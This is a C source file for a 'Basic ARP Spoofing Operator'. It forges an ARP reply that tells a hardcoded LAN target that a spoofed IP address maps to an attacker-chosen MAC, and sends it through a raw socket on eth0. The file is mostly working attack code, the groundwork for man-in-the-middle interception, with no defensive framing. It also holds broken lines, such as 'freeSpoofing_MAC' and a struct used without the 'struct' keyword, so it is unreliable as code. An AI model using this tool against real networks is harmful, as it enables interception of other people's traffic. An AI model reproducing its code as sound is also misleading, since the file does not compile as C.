/*  Copyright (C) 2011-2013  Vegetable avenger (r7418529@gmail.com)

    This program is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 3 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

/*
Version 1.0 : Basic ARP Spoofing Operator
*/

// Send an IPv4 ARP Spoofing packet via raw socket at the link layer (ethernet frame).

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <arpa/inet.h>
#include <sys/ioctl.h>
#include <bits/ioctls.h>
#include <net/if.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <errno.h>
//--------------------------------------------------------------------------
struct ARP_header
{
	unsigned short	Hardware ;
	unsigned short	Protocol ;
	unsigned char	HardwareAddressLen ;
	unsigned char	ProtocolAddressLeng ;
	unsigned short	Operation ;
	unsigned char	SoruceHardareAddr[6] ;
	unsigned char	SourceProtocolAddr[4] ;
	unsigned char	TargetHardareAddr[6] ;
	unsigned char	TargetProtocolAddr[4] ;
};
//---------------------------------------------------------
int main()
{
	unsigned char *Target_IP =NULL ;
	unsigned char *Soruce_IP =NULL;
	unsigned char *Target_MAC =NULL;
	unsigned char *Soruce_MAC =NULL;
	unsigned char *EthernetFrame =NULL ;
	unsigned char *Spoofing_IP =NULL;
	unsigned char *Spoofing_MAC =NULL;

	// malloc data
	Target_IP = (unsigned char*)malloc(sizeof(char)*4);
	Soruce_IP = (unsigned char*)malloc(sizeof(char)*4);
	Spoofing_IP = (unsigned char*)malloc(sizeof(char)*4);
	Target_MAC = (unsigned char*)malloc(sizeof(char)*6);
	Soruce_MAC = (unsigned char*)malloc(sizeof(char)*6);
	Spoofing_MAC = (unsigned char*)malloc(sizeof(char)*6);
	EthernetFrame =(unsigned char*)malloc(sizeof(char)*64);

	if(Target_IP==NULL ||
	   Soruce_IP==NULL ||
	   Spoofing_IP==NULL ||
	   Target_MAC==NULL ||
	   Soruce_MAC==NULL ||
	   Spoofing_MAC==NULL ||
	   EthernetFrame==NULL)
	{
	    printf("Error , malloc failed\n");
	    exit(-1);
	}

	unsigned int tSoruce_IP      = inet_addr("192.168.0.4");
//        unsigned int tTarget_IP      = inet_addr("192.168.0.3");
	unsigned int tTarget_IP      = inet_addr("192.168.0.100");
        unsigned int tSpoofing_IP    = inet_addr("192.168.0.6");
        memcpy(Soruce_IP , &tSoruce_IP ,sizeof(int));
        memcpy(Target_IP , &tTarget_IP ,sizeof(int));
        memcpy(Spoofing_IP , &tSpoofing_IP ,sizeof(int));


	unsigned char tSoruce_MAC[] 	= {0xc8,0xa0,0x30,0xb6,0x5c,0x1c ,0x0};
//	unsigned char tTarget_MAC[]	= {0x54,0x04,0xa6,0x75,0x8b,0x29 ,0x0};
	unsigned char tTarget_MAC[]     = {0x00,0x23,0x54,0x9e,0x8c,0xa7 ,0x0};
	unsigned char tSpoofing_MAC[]	= {0xc8,0xa0,0x30,0xb6,0x5c,0x22 ,0x0};
	memcpy(Soruce_MAC , tSoruce_MAC ,sizeof(char)*6);
	memcpy(Target_MAC , tTarget_MAC ,sizeof(char)*6);
	memcpy(Spoofing_MAC , tSpoofing_MAC ,sizeof(char)*6);


	// set ARP header
	ARP_header ARP_Spoofing ;
	ARP_Spoofing.Hardware = htons (1);
	ARP_Spoofing.Protocol = htons (2048);
	ARP_Spoofing.HardwareAddressLen = 6;
	ARP_Spoofing.ProtocolAddressLeng =4 ;
	ARP_Spoofing.Operation = htons(2);
	memcpy(ARP_Spoofing.SoruceHardareAddr  ,Spoofing_MAC	,sizeof(char)*6);
	memcpy(ARP_Spoofing.SourceProtocolAddr ,Spoofing_IP	,sizeof(char)*4);
	memcpy(ARP_Spoofing.TargetHardareAddr  ,Target_MAC,sizeof(char)*6);
	memcpy(ARP_Spoofing.TargetProtocolAddr ,Target_IP ,sizeof(char)*4);

	memcpy(EthernetFrame ,Target_MAC ,sizeof(char)*6);
	memcpy(EthernetFrame+6 ,Soruce_MAC ,sizeof(char)*6);
	EthernetFrame[12] = ETH_P_ARP / 256;
	EthernetFrame[13] = ETH_P_ARP % 256;

	// copy ARP header to ethernet packet
	memcpy (EthernetFrame + 14, &ARP_Spoofing, sizeof (char)*28);
	/*------------------------------------------*/
	 int ARPSocket ;

        // create socket
        printf("Create RAW Socket ... ");
        if( (ARPSocket = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL) )) <0)
	{
            printf("Faile\n");
            exit(-1);
	}
        printf("Successfully\n");

	struct sockaddr_ll device;
	if ((device.sll_ifindex = if_nametoindex ("eth0")) == 0)
	{
 	    printf("if_nametoindex() failed to obtain interface index ");
    	    exit (EXIT_FAILURE);
  	}
	printf ("Index for interface %s is %i\n", "eth0", device.sll_ifindex);

	device.sll_family = AF_PACKET;
  	device.sll_halen = htons (6);

//	while(1)
	{
	if (sendto (ARPSocket, EthernetFrame, 42, 0, (struct sockaddr *) &device, sizeof (device)) <= 0)
	{
	    perror ("sendto() failed");
	    exit (EXIT_FAILURE);
	}
	}

	// close socket
	close(ARPSocket);

	// free data
	free(Target_IP);
	free(Soruce_IP);
	free(Target_MAC);
	free(Soruce_MAC);
	free(EthernetFrame);
	free(Spoofing_IP);
	freeSpoofing_MAC
	printf("finish\n");
}
